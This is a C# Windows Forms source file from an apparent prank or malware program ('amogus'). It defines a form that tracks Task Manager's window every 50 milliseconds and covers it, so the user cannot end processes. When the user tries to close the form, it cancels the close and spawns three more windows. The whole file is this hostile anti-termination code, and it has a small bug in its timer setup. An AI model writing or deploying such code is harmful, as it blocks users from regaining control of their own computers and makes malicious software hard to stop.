using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Timer = System.Windows.Forms.Timer;

namespace amogus
{
    public partial class blockForm : Form
    {

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr FindWindow(string strClassName, string strWindowName);

        [DllImport("user32.dll")]
        public static extern bool GetWindowRect(IntPtr hwnd, ref Rect rectangle);

        Rectangle taskmgrPos;


        public blockForm()
        {
            InitializeComponent();

            Timer timer = new Timer();
            timer.Interval = 50; // 0.05 sec
            timer.Tick += new EventHandler(getTskmgrPos_Tick);
            timer.Start();

            Timer timer2 = new Timer();
            timer.Interval = 50;
            timer.Tick += new EventHandler(block_Tick);
            timer.Start();
        }

        protected override void OnClosing(CancelEventArgs e)
        {
            e.Cancel = true;
            new mainForm(false);
            new mainForm(false);
            new mainForm(false);
        }

        private void blockForm_Load(object sender, EventArgs e)
        {

        }

        public struct Rect
        {
            public int Left { get; set; }
            public int Top { get; set; }
            public int Right { get; set; }
            public int Bottom { get; set; }
        }

        private void getTskmgrPos_Tick(object sender, EventArgs e)
        {
            try
            {
                Process[] processes = Process.GetProcessesByName("Taskmgr");
                Process taskmgr = processes[0];
                IntPtr ptr = taskmgr.MainWindowHandle;
                Rect taskmgrRect = new Rect();

                if (!GetWindowRect(ptr, ref taskmgrRect))
                {
                    return;
                }

                taskmgrPos = new Rectangle();
                taskmgrPos.X = taskmgrRect.Left;
                taskmgrPos.Y = taskmgrRect.Top;
                taskmgrPos.Width = taskmgrRect.Right - taskmgrRect.Left + 1;
                taskmgrPos.Height = taskmgrRect.Bottom - taskmgrRect.Top + 1;
                Show();
            }

            catch
            {
                return;
            }

        }

        private void block_Tick(object sender, EventArgs e)
        {
            Location = new Point(taskmgrPos.X, taskmgrPos.Y - 10);
            Size = new Size(taskmgrPos.Width, taskmgrPos.Height);
        }
    }
}
